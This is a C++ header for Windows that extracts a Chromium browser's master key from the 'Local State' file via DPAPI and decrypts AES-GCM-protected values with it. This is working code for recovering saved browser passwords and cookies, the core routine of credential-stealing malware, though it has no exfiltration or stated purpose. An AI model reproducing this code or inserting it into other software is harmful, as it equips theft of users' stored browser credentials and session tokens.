#ifndef CRYPTO_ENGINE_H
#define CRYPTO_ENGINE_H

#include <windows.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <vector>
#include <string>
#include <fstream>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")

namespace CryptoEngine {

    
    inline std::string DecryptDPAPI(const std::vector<BYTE>& encrypted) {
        DATA_BLOB in{ static_cast<DWORD>(encrypted.size()), const_cast<BYTE*>(encrypted.data()) };
        DATA_BLOB out{ 0, nullptr };
        if (CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr, 0, &out)) {
            std::string decrypted(reinterpret_cast<char*>(out.pbData), out.cbData);
            LocalFree(out.pbData);
            return decrypted;
        }
        return "";
    }

    
    inline bool GetChromiumMasterKey(const std::wstring& localStatePath, std::vector<BYTE>& outMasterKey) {
        std::ifstream file(localStatePath.c_str());
        if (!file.is_open()) return false;

        std::string jsonContent((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
        file.close();

        size_t pos = jsonContent.find("\"encrypted_key\":\"");
        if (pos == std::string::npos) return false;

        pos += 17;
        size_t endPos = jsonContent.find("\"", pos);
        std::string base64Key = jsonContent.substr(pos, endPos - pos);

        DWORD dwLen = 0;
        CryptStringToBinaryA(base64Key.c_str(), 0, CRYPT_STRING_BASE64, NULL, &dwLen, NULL, NULL);
        std::vector<BYTE> encryptedBytes(dwLen);
        CryptStringToBinaryA(base64Key.c_str(), 0, CRYPT_STRING_BASE64, encryptedBytes.data(), &dwLen, NULL, NULL);

        if (encryptedBytes.size() < 5 || std::string((char*)encryptedBytes.data(), 5) != "DPAPI") {
            return false;
        }

        DATA_BLOB inBlob;
        inBlob.pbData = encryptedBytes.data() + 5;
        inBlob.cbData = static_cast<DWORD>(encryptedBytes.size() - 5);

        DATA_BLOB outBlob;
        if (CryptUnprotectData(&inBlob, NULL, NULL, NULL, NULL, 0, &outBlob)) {
            outMasterKey.assign(outBlob.pbData, outBlob.pbData + outBlob.cbData);
            LocalFree(outBlob.pbData);
            return true;
        }
        return false;
    }

    
    inline std::string DecryptAESGCM(const BYTE* ciphertext, DWORD ciphertextLen, const BYTE* iv, const BYTE* tag, const std::vector<BYTE>& masterKey) {
        BCRYPT_ALG_HANDLE hAlg = NULL;
        BCRYPT_KEY_HANDLE hKey = NULL;
        std::string plaintext = "";

        if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) return "";

        if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0) != 0) {
            BCryptCloseAlgorithmProvider(hAlg, 0);
            return "";
        }

        DWORD cbKeyObject = 0, cbData = 0;
        BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&cbKeyObject, sizeof(DWORD), &cbData, 0);
        std::vector<BYTE> keyObject(cbKeyObject);

        DWORD blobLen = sizeof(BCRYPT_KEY_DATA_BLOB_HEADER) + static_cast<DWORD>(masterKey.size());
        std::vector<BYTE> keyBlob(blobLen);
        BCRYPT_KEY_DATA_BLOB_HEADER* blobHeader = reinterpret_cast<BCRYPT_KEY_DATA_BLOB_HEADER*>(keyBlob.data());
        blobHeader->dwMagic = BCRYPT_KEY_DATA_BLOB_MAGIC;
        blobHeader->dwVersion = BCRYPT_KEY_DATA_BLOB_VERSION1;
        blobHeader->cbKeyData = static_cast<DWORD>(masterKey.size());
        memcpy(keyBlob.data() + sizeof(BCRYPT_KEY_DATA_BLOB_HEADER), masterKey.data(), masterKey.size());

        if (BCryptImportKey(hAlg, NULL, BCRYPT_KEY_DATA_BLOB, &hKey, keyObject.data(), cbKeyObject, keyBlob.data(), blobLen, 0) != 0) {
            BCryptCloseAlgorithmProvider(hAlg, 0);
            return "";
        }

        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
        BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
        authInfo.pbNonce = (PUCHAR)iv;
        authInfo.cbNonce = 12;
        authInfo.pbTag = (PUCHAR)tag;
        authInfo.cbTag = 16;

        DWORD cbPlaintext = 0;
        if (BCryptDecrypt(hKey, (PUCHAR)ciphertext, ciphertextLen, &authInfo, NULL, 0, NULL, 0, &cbPlaintext, 0) == 0) {
            std::vector<BYTE> plainBuffer(cbPlaintext);
            if (BCryptDecrypt(hKey, (PUCHAR)ciphertext, ciphertextLen, &authInfo, NULL, 0, plainBuffer.data(), cbPlaintext, &cbPlaintext, 0) == 0) {
                plaintext.assign(plainBuffer.begin(), plainBuffer.end());
            }
        }

        if (hKey) BCryptDestroyKey(hKey);
        if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);

        return plaintext;
    }
}

#endif